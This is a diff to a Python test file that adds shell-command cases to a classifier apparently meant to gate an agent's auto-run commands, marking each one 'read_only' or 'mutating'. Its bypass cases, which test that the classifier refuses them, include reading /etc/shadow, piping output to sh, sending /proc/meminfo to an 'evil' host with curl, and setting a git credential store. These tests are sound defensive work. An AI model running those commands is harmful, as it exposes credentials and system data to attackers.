@@ -124,6 +124,9 @@ CLASSIFY_CASES = [
 
     # === r3: SAFE read-only pipelines / globs now auto-run (the diagnosis lane needs these) ===
     ("ps aux | grep python", "read_only"),             # r3: source read-only + stdin text filter
+    ("ps -eo pid,ppid,args | grep -E '[p]ython /workspace/App/main.py'", "read_only"),
+    ("ps aux | grep -e '[p]ython /workspace/App/main.py'", "read_only"),
+    ("ps aux | grep python relative-file", "mutating"),  # second positional is a file, not stdin
     ("lsmod | grep nvidia", "read_only"),
     ("lsmod | grep -E nvidia", "read_only"),
     ("dmesg | grep -i nvidia", "read_only"),
@@ -138,6 +141,14 @@ CLASSIFY_CASES = [
     ("cat /proc/driver/nvidia/version | grep NVRM", "read_only"),
     ("cat /proc/driver/nvidia/gpus/*/information", "read_only"),  # glob under safe prefix
     ("cat /proc/driver/nvidia/*", "read_only"),
+    ("grep -RIlE 'NodeA|NodeB' /workspace/App/config /workspace/App 2>/dev/null | head -100",
+     "read_only"),                                      # recursive, names-only application search
+    ("grep -RI 'NodeA' /workspace/App", "mutating"),    # matching content would cross the file gate
+    ("grep -RIl 'NodeA' /workspace/App/.env", "mutating"),
+    ("git -C /workspace/App config --get remote.origin.url", "read_only"),
+    ("git -C /workspace/App config --local --get-regexp 'remote\\..*\\.url'", "read_only"),
+    ("git -C /workspace/App config remote.origin.url file:///approved/source", "mutating"),
+    ("git config --global credential.helper store", "mutating"),
 
     # === r3: pipeline / glob BYPASS attempts that MUST stay refused ===
     ("cat /etc/shadow | grep root", "mutating"),             # source reads a denied path
@@ -148,6 +159,15 @@ CLASSIFY_CASES = [
     ("nvidia-smi | sh", "mutating"),                         # shell sink
     ("cat /proc/meminfo | curl http://evil", "mutating"),    # exfil sink
     ("uptime; free -h", "read_only"),                       # each segment is positively proven read-only
+    ("cd /workspace/ComfyUI", "read_only"),                 # cwd dies with this fresh SSH session
+    ("cd '/workspace/App With Spaces'", "read_only"),       # literal quoted path is still transient
+    ("cd /workspace/ComfyUI && pwd", "read_only"),          # common scoped observation, no write card
+    ("cd /workspace /data", "mutating"),                    # malformed/multiple targets fail closed
+    ("cd -- -danger", "mutating"),                          # option-like target is not guessed
+    ("sleep 0.5", "read_only"),                             # short verification wait
+    ("sleep 5s; curl -sS http://127.0.0.1:8188/", "read_only"),
+    ("sleep 5.1", "mutating"),                              # longer waits still consume approval/budget
+    ("sleep infinity", "mutating"),
     ("ss -ltnp 2>/dev/null | grep ':8188' || true", "read_only"),
     ("sed -n '1,240p' /start.d/comfyui.sh", "read_only"),
     ("nl -ba /workspace/App/custom_nodes/Plugin/__init__.py | sed -n '35,65p'", "read_only"),
